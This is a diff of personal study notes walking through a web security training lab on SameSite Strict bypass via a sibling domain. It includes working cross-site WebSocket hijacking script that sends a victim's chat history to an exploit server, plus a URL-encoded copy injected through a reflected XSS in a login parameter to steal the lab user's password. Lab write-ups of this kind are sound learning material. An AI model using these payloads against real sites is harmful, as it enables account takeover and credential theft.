@@ -169,6 +169,52 @@ window.location="https://0ada006904d7f8cc809c215000890045.web-security-academy.n
 
 # Lab: SameSite Strict bypass via sibling domain
 - This lab can only be Done when you understand websocket vulnerabilities, coming back to solve this when I understand that topic.
+- Now I can solve the lab 
+- This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). 
+- To solve the lab, log in to the victim's account.
+- To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. 
+- The chat history contains the login credentials in plain text.
+
+# Solution
+- Browse through the app and check request in burp suite
+- Read through request including javascript files
+- Read even the request and response headers
+- You will notice that the websocket request is vulnerable to csrf
+- Try the below request saved to burp collaborator
+```
+<script>
+    const socket = new WebSocket("wss://0aeb00fc034ffebc809c2bef00d10010.web-security-academy.net/chat");
+
+    socket.onopen = function() {
+    // Send "Ready" when connection is established
+    socket.send("READY");
+    };
+
+    socket.onmessage = function(event) {
+    fetch(
+        "https://exploit-0ac7004a036efe1e80532aa8019f002d.exploit-server.net/exploit?message=" + event.data
+    )
+    };   
+</script>
+```
+
+- Notice that the response is not that great we need more response from
+- Look through the javascript files and notice that the allowed
+- Notice The Acsess Control allow origin allows another sibling domain 
+- Copy the domain and notice how the login is vulnerable to xss
+- change the request from POST to GET and notice that it is still possible
+- Convert the above code to url encoding and paste it in the GET request, notice how it will put all the javascript on the screen
+- Then copy the whole url and do this in the exploit server
+
+```
+<script>
+window.location="https://cms-0aeb00fc034ffebc809c2bef00d10010.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%63%6f%6e%73%74%20%73%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%65%62%30%30%66%63%30%33%34%66%66%65%62%63%38%30%39%63%32%62%65%66%30%30%64%31%30%30%31%30%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%0a%20%20%20%20%73%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%2f%2f%20%53%65%6e%64%20%22%52%65%61%64%79%22%20%77%68%65%6e%20%63%6f%6e%6e%65%63%74%69%6f%6e%20%69%73%20%65%73%74%61%62%6c%69%73%68%65%64%0a%20%20%20%20%73%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%0a%20%20%20%20%73%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%66%65%74%63%68%28%0a%20%20%20%20%20%20%20%20%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%63%37%30%30%34%61%30%33%36%65%66%65%31%65%38%30%35%33%32%61%61%38%30%31%39%66%30%30%32%64%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%20%65%76%65%6e%74%2e%64%61%74%61%0a%20%20%20%20%29%0a%20%20%20%20%7d%3b%20%20%20%0a%3c%2f%73%63%72%69%70%74%3e&password=books"
+</script>
+```
+- Go to exploit server deliver to victim
+- Go to server logs and copy carlos password.
+- Login to carlos account and solve the love
+ 
 
 # Lab: SameSite Lax bypass via cookie refresh
 ## Study the change email function
